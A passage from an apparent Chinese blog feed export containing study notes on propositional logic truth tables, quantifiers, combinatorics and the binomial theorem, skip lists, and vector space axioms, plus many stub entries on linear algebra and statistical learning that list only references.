<blockquote>
<h3 id="定义2"><a href="#定义2" class="headerlink" title="定义2"></a>定义2</h3></blockquote>
<p>若p和q为命题。p和q的合取用p∧q表示,既命题p并且q。当p和q都为真时,命题p∧q为真,否则为假。</p>
<p>p∧q的真值表:</p>
<table>
<tr>
    <td>p</td> 
    <td>q</td> 
    <td>p∧q</td> 
</tr>
<tr>
    <td>F</td> 
    <td>F</td> 
    <td>F</td> 
</tr>
<tr>
    <td>F</td> 
    <td>T</td> 
    <td>F</td> 
</tr>

<tr>
    <td>T</td> 
    <td>F</td> 
    <td>F</td> 
</tr>

<tr>
    <td>T</td> 
    <td>T</td> 
    <td>T</td> 
</tr>
</table>

<blockquote>
<h3 id="定义3"><a href="#定义3" class="headerlink" title="定义3"></a>定义3</h3></blockquote>
<p>若p和q为命题。p和q的析取用p∨q表示,既命题p或q。当p和q都为假时,命题p∨q为假,否则为真。</p>
<p>p∨q的真值表:</p>
<table>
<tr>
    <td>p</td> 
    <td>q</td> 
    <td>p∨q</td> 
</tr>
<tr>
    <td>F</td> 
    <td>F</td> 
    <td>F</td> 
</tr>
<tr>
    <td>F</td> 
    <td>T</td> 
    <td>T</td> 
</tr>

<tr>
    <td>T</td> 
    <td>F</td> 
    <td>T</td> 
</tr>

<tr>
    <td>T</td> 
    <td>T</td> 
    <td>T</td> 
</tr>
</table>

<blockquote>
<h3 id="定义4"><a href="#定义4" class="headerlink" title="定义4"></a>定义4</h3></blockquote>
<p>若p和q为命题。p和q的异或用p⊕q表示。当p和q有一个为真时,命题p⊕q为真,否则为假。</p>
<p>p⊕q的真值表:</p>
<table>
<tr>
    <td>p</td> 
    <td>q</td> 
    <td>p⊕q</td> 
</tr>
<tr>
    <td>F</td> 
    <td>F</td> 
    <td>F</td> 
</tr>
<tr>
    <td>F</td> 
    <td>T</td> 
    <td>T</td> 
</tr>

<tr>
    <td>T</td> 
    <td>F</td> 
    <td>T</td> 
</tr>

<tr>
    <td>T</td> 
    <td>T</td> 
    <td>F</td> 
</tr>
</table>

<blockquote>
<h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><h3 id="定义5"><a href="#定义5" class="headerlink" title="定义5"></a>定义5</h3><p>令p和q为命题.条件语句p→q是命题“若p，则q”。当p为真而q为假时，条件语句p→q为假，否则为真。在条件语句p→q中，p称为假设(或前项、前提)，q称为结论(或推论)。称语句p→q为条件语句，是因为p→q可以断定在条件p成立的时候q为真。条件语句也称为蕴含。</p>
</blockquote>
<p>p-&gt;q的真值表:</p>
<table>
<tr>
    <td>p</td> 
    <td>q</td> 
    <td>p->q</td> 
</tr>
<tr>
    <td>F</td> 
    <td>F</td> 
    <td>T</td> 
</tr>
<tr>
    <td>F</td> 
    <td>T</td> 
    <td>T</td> 
</tr>

<tr>
    <td>T</td> 
    <td>F</td> 
    <td>F</td> 
</tr>

<tr>
    <td>T</td> 
    <td>T</td> 
    <td>T</td> 
</tr>
</table>


<blockquote>
<h3 id="定义6"><a href="#定义6" class="headerlink" title="定义6"></a>定义6</h3></blockquote>
<p>令p和q为命题。双条件语句p &lt;-&gt; q是命题“p当且仅当q”。当p和q有同样的真值时，双条件语句为真，否则为假。双条件语句也称为双蕴含。</p>
<p>p&lt;-&gt;q的真值表:</p>
<table>
<tr>
    <td>p</td> 
    <td>q</td> 
    <td>p<->q</-></td> 
</tr>
<tr>
    <td>F</td> 
    <td>F</td> 
    <td>T</td> 
</tr>
<tr>
    <td>F</td> 
    <td>T</td> 
    <td>F</td> 
</tr>

<tr>
    <td>T</td> 
    <td>F</td> 
    <td>F</td> 
</tr>

<tr>
    <td>T</td> 
    <td>T</td> 
    <td>T</td> 
</tr>
</table>


<blockquote>
<ul>
<li>构造复合命题(P∨Q) -&gt; (Q∧R) 的真值表</li>
</ul>
</blockquote>
<table>
<tr>
    <td>P</td> 
    <td>Q</td> 
    <td>R</td> 
    <td>P∨Q</td> 
    <td>Q∧R</td> 
    <td>(P∨Q) -> (Q∧R)</td> 
</tr>
<tr>
    <td>0</td> 
    <td>0</td> 
    <td>0</td> 
    <td>0</td> 
    <td>0</td> 
    <td>1</td> 
</tr>

<tr>
    <td>0</td> 
    <td>0</td> 
    <td>1</td> 
    <td>0</td> 
    <td>0</td> 
    <td>1</td> 
</tr>

<tr>
    <td>0</td> 
    <td>1</td> 
    <td>0</td> 
    <td>1</td> 
    <td>0</td> 
    <td>0</td> 
</tr>

<tr>
    <td>0</td> 
    <td>1</td> 
    <td>1</td> 
    <td>1</td> 
    <td>1</td> 
    <td>1</td> 
</tr>

<tr>
    <td>1</td> 
    <td>0</td> 
    <td>0</td> 
    <td>1</td> 
    <td>0</td> 
    <td>0</td> 
</tr>

<tr>
    <td>1</td> 
    <td>0</td> 
    <td>1</td> 
    <td>1</td> 
    <td>0</td> 
    <td>0</td> 
</tr>

<tr>
    <td>1</td> 
    <td>1</td> 
    <td>0</td> 
    <td>1</td> 
    <td>0</td> 
    <td>0</td> 
</tr>
<tr>
    <td>1</td> 
    <td>1</td> 
    <td>1</td> 
    <td>1</td> 
    <td>1</td> 
    <td>1</td> 
</tr>

</table>

<blockquote>
<h2 id="逻辑运算符的优先级"><a href="#逻辑运算符的优先级" class="headerlink" title="逻辑运算符的优先级"></a>逻辑运算符的优先级</h2></blockquote>
<table>

<tr>
    <td>运算符</td> 
    <td>优先级</td> 

</tr>

<tr>
    <td>¬</td> 
    <td>1</td> 
</tr> 

<tr>
    <td>∧</td> 
    <td>2</td> 
</tr>
<tr>
    <td>∨</td> 
    <td>3</td> 
</tr>

<tr>
    <td>-></td> 
    <td>4</td> 
</tr>
<tr>
    <td><-></-></td> 
    <td>5</td> 
</tr>

</table>

<blockquote>
<h2 id="翻译语句"><a href="#翻译语句" class="headerlink" title="翻译语句"></a>翻译语句</h2></blockquote>
<p>把下面句子翻译为逻辑表达式.</p>
<blockquote>
<ul>
<li>“除非你已满16周岁，否则只要你身高不足4英尺θ就不能乘公园滑行铁道游乐车。”</li>
</ul>
</blockquote>
<p>令q、r和s分别表示“你能乘公园滑行铁道游乐车”、“你身高不足4英尺”和“你已满16周岁”，则上述句子可以翻译为(r∧¬s)→¬q.</p>
<blockquote>
<h1 id="命题等价"><a href="#命题等价" class="headerlink" title="命题等价"></a>命题等价</h1><h2 id="定义1-1"><a href="#定义1-1" class="headerlink" title="定义1"></a>定义1</h2></blockquote>
<p>复合命题称为永真式(或重言式)，  如果无论其中出现的命题的真值是什么，它的真值总是真。真值永远为假的复合命题称为矛盾。最后，既不是永真式又不是矛盾的命题称为可能式。</p>
<blockquote>
<h2 id="定义2-1"><a href="#定义2-1" class="headerlink" title="定义2"></a>定义2</h2></blockquote>
<p>如果p&lt;-&gt;q是永真式，命题p和q称为是逻辑等价的。记号p三q表示p和q逻辑等价。符号三不是逻辑联接词，因为p三q不是复合命题，而语句p←→q是永真式。符号&lt;=&gt;有时用来代替三表示等价。</p>
<blockquote>
<ul>
<li>证明 ¬(p∨q) 和 ¬p∧¬q</li>
</ul>
</blockquote>
<p>利用真值表证明.</p>
<table>

<tr>
    <td>p</td> 
    <td>q</td> 
    <td>p∨q</td>
    <td>¬(p∨q)</td> 
    <td>¬p</td> 
    <td>¬q</td> 
    <td>¬p∧¬q</td>  
</tr>

<tr>
    <td>0</td> 
    <td>0</td> 
    <td>0</td>
    <td>1</td> 
    <td>1</td> 
    <td>1</td> 
    <td>1</td>  
</tr>

<tr>
    <td>0</td> 
    <td>1</td> 
    <td>1</td>
    <td>0</td> 
    <td>1</td> 
    <td>0</td> 
    <td>0</td>  
</tr>
<tr>
    <td>1</td> 
    <td>0</td> 
    <td>1</td>
    <td>0</td> 
    <td>0</td> 
    <td>1</td> 
    <td>0</td>  
</tr>
<tr>
    <td>1</td> 
    <td>1</td> 
    <td>1</td>
    <td>0</td> 
    <td>0</td> 
    <td>0</td> 
    <td>0</td>  
</tr>

</table>


<blockquote>
<h1 id="谓词和量词"><a href="#谓词和量词" class="headerlink" title="谓词和量词"></a>谓词和量词</h1></blockquote>
<p>当命题函数中所有变量均被赋值时，得到的命题有一个具值。还有另一里安力式，也可以从命题函数产生命题，这就是量化。量化表示谓词在一定范围的事物上成立的程度。在语言中，单词“所有”、“一些”、“许多”、“没有”，以及“没几个”被用于量化。这里讨论两类量化:全称量化，它告诉我们一个谓词在所考虑的每- -对象中都为真;存在量化，它告诉我们一个谓词对所考虑中的一个或多个对象成真。处理谓词和量词的逻辑领域称为谓词演算。<br>全称量词  许多数学命题对于某一性质在变量的某一特定域内的所有值均为真，这一特定域称为变量的论域(或全体域)，时常简单地称为域。这类语句用全称量化表示。P(x)对特定论域的全称量化是指:它断言P(x)对x在其论域中的所有值为真。注意,论域是变量x所有可能指定的值。  当我们改变论域时，P(x) 的全称量化的意义也随之改变。  在用全称量词时，必须指定论域，否则语句的全称量词无意义。</p>
<blockquote>
<h1 id="嵌套量词"><a href="#嵌套量词" class="headerlink" title="嵌套量词"></a>嵌套量词</h1><h1 id="推理规则"><a href="#推理规则" class="headerlink" title="推理规则"></a>推理规则</h1><h1 id="证明导论"><a href="#证明导论" class="headerlink" title="证明导论"></a>证明导论</h1><h1 id="证明的方法和策略"><a href="#证明的方法和策略" class="headerlink" title="证明的方法和策略"></a>证明的方法和策略</h1><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>&lt;离散数学及其应用原书第六版&gt;</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论基础一之组合分析</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9F%BA%E7%A1%80%E4%B8%80%E4%B9%8B%E7%BB%84%E5%90%88%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="排列"><a href="#排列" class="headerlink" title="排列"></a>排列</h1><h1 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h1><p>从n个元素中取r个组成一组，一共有多少个不同的组？</p>
<p>一般来说，如果考虑顺序的话一共有n(n-1)(n-2)…(n-r+1)个组,而每个含r个元素的小组都被重复记录了r!次.所以从n个元素中取r个组成不同组的数目为:</p>
<script type="math/tex; mode=display">
\frac{n(n-1)(n-2)...(n-r+1)}{r!} = \frac{n!}{(n-r)!r!}</script><p>对于r&lt;=n，我们定义$\dbinom{n}{r}$如下:</p>
<script type="math/tex; mode=display">
\dbinom{n}{r} = \frac{n!}{(n-r)!r!}</script><p>这样就表示从n个元素中取r个的可能组合数.</p>
<p>值$\dbinom{n}{r}$经常称为二项式系数,是因为它们是二项式定理中对的主要系数。</p>
<h2 id="二项式定理"><a href="#二项式定理" class="headerlink" title="二项式定理"></a>二项式定理</h2><script type="math/tex; mode=display">
(x+y)^n = \sum_{k=0}^n \dbinom{n}{k} x^k y^{n-k}</script><blockquote>
<p>例子: 展开$(x+y)^3$</p>
</blockquote>
<p>解:<br> $<br> (x+y)^3 = \dbinom{3}{0} x^0 y^{3} + \dbinom{3}{1} x^1 y^{2} + \dbinom{3}{2} x^2 y^{1} + \dbinom{3}{3} x^3 y^{0}<br>         = y^{3} + 3xy^{2} + 3x^{2}y + x^{3}<br> $</p>
<h2 id="多项式系数"><a href="#多项式系数" class="headerlink" title="多项式系数"></a>多项式系数</h2><p>从n个元素中取r组,每组分别有 <script type="math/tex">n_1,n_2,...n_r</script>个元素,其中 <script type="math/tex">\sum_{i=0}^r n_i = n</script> ,一共有多少种不同的分法？</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>概率论与数理统计 第四版</li>
<li>概率论基础教程(原书第9版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>跳表(Skip List)</title>
    <url>/2019/03/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/%E8%B7%B3%E8%A1%A8(Skip%20List)/</url>
    <content><![CDATA[<h1 id="简介-wiki"><a href="#简介-wiki" class="headerlink" title="简介[wiki]"></a>简介[wiki]</h1><p>跳跃列表是一种数据结构。它允许快速查询一个有序连续元素的数据链表。跳跃列表的平均查找和插入时间复杂度都是O(log n)，优于普通队列的O(n)。</p>
<p>快速查询是通过维护一个多层次的链表，且每一层链表中的元素是前一层链表元素的子集（见右边的示意图）。一开始时，算法在最稀疏的层次进行搜索，直至需要查找的元素在该层两个相邻的元素中间。这时，算法将跳转到下一个层次，重复刚才的搜索，直到找到需要查找的元素为止。跳过的元素的方法可以是随机性选择或确定性选择，其中前者更为常见。</p>
<a id="more"></a>
<p><img src="/2019/03/31/数据结构和算法/跳表(Skip List)/skip_list_20190331182430.png" alt="相关数据结构"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Skip_list" target="_blank" rel="noopener">Skip List wiki</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数据结构和算法</category>
      </categories>
      <tags>
        <tag>skip list</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数三之向量空间</title>
    <url>/2018/08/14/%E6%95%B0%E5%AD%A6/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E4%B8%89%E4%B9%8B%E5%90%91%E9%87%8F%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<p>向量空间是现代数学中的一个基本概念。是线性代数研究的基本对象。</p>
<p>向量空间的一个直观模型是向量几何，几何上的向量及相关的运算即向量加法，标量乘法，以及对运算的一些限制如封闭性，结合律，已大致地描述了“向量空间”这个数学概念的直观形象。</p>
<p>在现代数学中，“向量”的概念不仅限于此，满足下列公理的任何数学对象都可被当作向量处理。譬如，实系数多项式的集合在定义适当的运算后构成向量空间，在代数上处理是方便的。单变元实函数的集合在定义适当的运算后，也构成向量空间，研究此类函数向量空间的数学分支称为泛函分析。<br><a id="more"></a></p>
<h1 id="定义和例子"><a href="#定义和例子" class="headerlink" title="定义和例子"></a>定义和例子</h1><h2 id="欧几里得向量空间"><a href="#欧几里得向量空间" class="headerlink" title="欧几里得向量空间"></a>欧几里得向量空间</h2><p>首先最基本的向量空间就是欧几里得向量空间$R^n,n=1,2,3…$。为简单起见我们首先考虑$R^2$。$R^2$中的非零向量在几何上表示有向线段。这种集合表示有利于我们理解$R^2$中标量乘法和加法的作用。给定一非零向量$\vec{x} = \begin{bmatrix}<br>x_1 \<br>x_2<br>\end{bmatrix}$,可将其和一个坐标平面上从(0,0)到点$(x_1,x_2)$的有向线段对应起来。如果将相同长度和方向的线段看成是相同的,则$\vec{x}$可用任何从(a,b)到$(a+x_1,b+x_2)$的线段表示。<br>我们将向量$\vec{x} = \begin{bmatrix}<br>x_1 \<br>x_2<br>\end{bmatrix}$的欧几里得长度看成是任何表示$\vec{x}$的有向线段的长度。从(0,0)到$(x_1,x_2)$的有向线段的长度为$\sqrt{x_1^2+x_2^2}$。对每一个向量$\vec{x} = \begin{bmatrix}<br>x_1 \<br>x_2<br>\end{bmatrix}$和每一个标量$\alpha$,乘积$\alpha\vec{x}$定义为$\alpha\begin{bmatrix}<br>x_1 \<br>x_2<br>\end{bmatrix} =\begin{bmatrix}<br>\alpha x_1 \<br>\alpha x_2<br>\end{bmatrix} $。</p>
<p>两个向量<br>$<br>\vec{a}=\begin{bmatrix}<br>a_1 \<br>a_2<br>\end{bmatrix} 和<br>\vec{b}=\begin{bmatrix}<br>b_1 \<br>b_2<br>\end{bmatrix}的和的定义为 \vec{a}+\vec{b} = \begin{bmatrix}<br>a_1+b_1 \<br>a_2+b_2<br>\end{bmatrix}$。如果$\vec{b}$放置在$\vec{a}$的终点上,则$\vec{a}+\vec{b}$表示从$\vec{a}$的起点到$\vec{b}$的终点的有向线段。</p>
<p>一般地，$R^n$中的标量乘法和加法定义为<br>$\alpha \vec{x}=\begin{bmatrix}<br>\alpha x_1 \<br>\alpha x_2 \<br>{\vdots}\<br>\alpha x_n<br>\end{bmatrix} 和 \vec{x}+\vec{y} = \begin{bmatrix}<br>x_1+y_1 \<br>x_2+y_2 \<br>{\vdots}\<br>x_n+y_n<br>\end{bmatrix}$，其中$\vec{x},\vec{y} \in R^n,且\alpha为标量$。</p>
<h2 id="向量空间-R-m-times-n"><a href="#向量空间-R-m-times-n" class="headerlink" title="向量空间$R^{m\times n}$"></a>向量空间$R^{m\times n}$</h2><p>我们可以将$R^n$空间看成是所有元素都是实数的$n\times 1$矩阵的集合。$R^n$中向量的加法和标量乘法就是通常的矩阵的加法和标量的乘法。更一般地,用$R^{m\times n}$表示所有$m\times n$实矩阵的集合。$R^{m\times n}$上的加法运算和标量乘法运算遵循特定的代数运算法则。这些法则构成了定义向量空间概念的公理。</p>
<h2 id="向量空间的公理"><a href="#向量空间的公理" class="headerlink" title="向量空间的公理"></a>向量空间的公理</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>令V为一定义了加法和标量乘法运算的集合。这意味着，对V中的每一对元素x和y,可唯一对应V中的一个元素x+y，且对每一个V中的元素x和每一个标量a,可唯一对应V中的元素ax。如果集合V连同其上的加法和标量乘法运算满足下面的公理,则称为向量空间。</p>
<ol>
<li>对V中的任何的x和y,x+y = y+x。</li>
<li>对V中的任何的x,y和z。(x+y)+z = x+(y+z)。</li>
<li>V中存在一个元素0,满足对任意的$x\in V$有x+0 = x 。</li>
<li>对每一$x\in V$,存在V中的一个元素-x,满足 x+(-x) = 0。</li>
<li>对任意标量a和V中的元素x,y,有 a(x+y) = ax+ ay。</li>
<li>对任意标量a和b及$x\in V$,有(a+b)x = ax+bx。</li>
<li>对任意标量a和b及$x\in V$,有(ab)x = a(bx)。</li>
<li>对所有$x\in V$,有 $1\cdot x = x$ 。</li>
</ol>
<p>我们称V为空间向量的全集,它的元素称为向量(vector)。并用黑斜体小写字母表示。术语标量(scalar)通常是指实数,一般用小写字母表示。<br>定义中一个重要的部分是两个运算的封闭性,这个性质可以归纳如下:</p>
<ol>
<li>若$x\in V$,且a为标量，则$ax \in V$。</li>
<li>若 $x,y\in V$,则 $ x+y \in V$。</li>
</ol>
<p>如果一个集合不满足封闭性则不是向量空间。例如 W= { (a,1)|a是实数 },可能不满足加法和标量乘法。</p>
<h2 id="向量空间C-a-b"><a href="#向量空间C-a-b" class="headerlink" title="向量空间C[a,b]"></a>向量空间C[a,b]</h2><p>用向量空间C[a,b]表示所有定义在闭区间[a,b]上的实值连续函数。此时，全集为一函数集合。因此，我们的向量为C[a,b]中的函数。C[a,b]中两个函数的和f+g定义为对所有[a,b]中的x,(f+g)(x) = f(x)+g(x)。新函数f+g也是C[a,b]中的元素,因为两个连续函数的和仍为连续函数。同理,若f是C[a,b]中的函数，a为一个实数，则af定义为对所有[a,b]中的x,(af)(x) = af(x)。显然af是[a,b]中的元素,因为一个数乘以一个连续函数也总是连续函数。</p>
<h2 id="向量空间-P-n"><a href="#向量空间-P-n" class="headerlink" title="向量空间$P_n$"></a>向量空间$P_n$</h2><p>令$P_n$表示次数小于n的所有多项式的集合。定义p+q和ap为所有的实数x,有(p+q)(x) = p(x)+q(x)且(ap)(x) = ap(x)。<br>此时，零向量是零多项式，$<br>z(x)  = 0x^{n-1}+0x^{n-2}+…+0x+0<br>$。容易验证,向量空间的所有公理都成立。因此,$P_n$连同一般的函数加法和标量乘法构成一个向量空间。</p>
<h2 id="向量空间的其他性质"><a href="#向量空间的其他性质" class="headerlink" title="向量空间的其他性质"></a>向量空间的其他性质</h2><h3 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h3><p>若V为向量空间,且x为V中的任一元素，则:</p>
<ol>
<li>0x=<strong>0</strong></li>
<li>x+y = <strong>0</strong> 蕴涵 y=-x</li>
<li>(-1)x = -x</li>
</ol>
<h1 id="子空间"><a href="#子空间" class="headerlink" title="子空间"></a>子空间</h1><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>若S为向量空间V的非空子集,且S满足如下条件,</p>
<blockquote>
<ul>
<li>对任意标量a,若$x\in S$,则$ax \in S$</li>
<li>若 $x\in S 且y\in S$,则$x+y \in S$<br>则S称为V的子空间。</li>
</ul>
</blockquote>
<p>向量空间的任何子空间仍未向量空间。</p>
<p>注意，在向量空间V中，容易验证{0}和V是V的子空间。所有其他子空间称为真子空间。我们称{0}为零空间。</p>
<h2 id="矩阵的零空间"><a href="#矩阵的零空间" class="headerlink" title="矩阵的零空间"></a>矩阵的零空间</h2><p>\text{…}</p>
<h2 id="向量集合的张成"><a href="#向量集合的张成" class="headerlink" title="向量集合的张成"></a>向量集合的张成</h2><h2 id="向量空间的张成"><a href="#向量空间的张成" class="headerlink" title="向量空间的张成"></a>向量空间的张成</h2><h1 id="线性无关"><a href="#线性无关" class="headerlink" title="线性无关"></a>线性无关</h1><h1 id="基和维数"><a href="#基和维数" class="headerlink" title="基和维数"></a>基和维数</h1><h1 id="基变换"><a href="#基变换" class="headerlink" title="基变换"></a>基变换</h1><h1 id="行空间和列空间"><a href="#行空间和列空间" class="headerlink" title="行空间和列空间"></a>行空间和列空间</h1><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E5%90%91%E9%87%8F%E7%A9%BA%E9%97%B4" target="_blank" rel="noopener">向量空间</a></li>
<li>线性代数Steven J Leon(原书第8版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线代</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数七之数值线性代数</title>
    <url>/2018/07/21/%E6%95%B0%E5%AD%A6/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E4%B8%83%E4%B9%8B%E6%95%B0%E5%80%BC%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/</url>
    <content><![CDATA[<blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>线性代数Steven J Leon(原书第8版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线代</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数五之正交性</title>
    <url>/2018/07/21/%E6%95%B0%E5%AD%A6/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E4%BA%94%E4%B9%8B%E6%AD%A3%E4%BA%A4%E6%80%A7/</url>
    <content><![CDATA[<blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>线性代数Steven J Leon(原书第8版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线代</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数六之特征值</title>
    <url>/2018/07/21/%E6%95%B0%E5%AD%A6/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E5%85%AD%E4%B9%8B%E7%89%B9%E5%BE%81%E5%80%BC/</url>
    <content><![CDATA[<blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>线性代数Steven J Leon(原书第8版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线代</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学一之统计学习方法概论</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B8%80%E4%B9%8B%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E6%A6%82%E8%AE%BA/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学七之支持向量机</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B8%83%E4%B9%8B%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数四之线性变换</title>
    <url>/2018/07/21/%E6%95%B0%E5%AD%A6/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E5%9B%9B%E4%B9%8B%E7%BA%BF%E6%80%A7%E5%8F%98%E6%8D%A2/</url>
    <content><![CDATA[<blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>线性代数Steven J Leon(原书第8版)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线代</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学九之EM算法及其推广</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%9D%E4%B9%8BEM%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%8E%A8%E5%B9%BF/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学三之k紧邻法</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B8%89%E4%B9%8Bk%E7%B4%A7%E9%82%BB%E6%B3%95/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学五之决策树</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%BA%94%E4%B9%8B%E5%86%B3%E7%AD%96%E6%A0%91/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学二之感知机</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%BA%8C%E4%B9%8B%E6%84%9F%E7%9F%A5%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学十一之条件随机场</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E5%8D%81%E4%B8%80%E4%B9%8B%E6%9D%A1%E4%BB%B6%E9%9A%8F%E6%9C%BA%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学八之提升方法</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E5%85%AB%E4%B9%8B%E6%8F%90%E5%8D%87%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学十二之统计学习方法总结</title>
    <url>/2018/08/04/%E6%95%B0%E5%AD%A6/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E5%8D%81%E4%BA%8C%E4%B9%8B%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>统计学习方法(李航)</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>统计学十之隐马尔可夫模型</title>
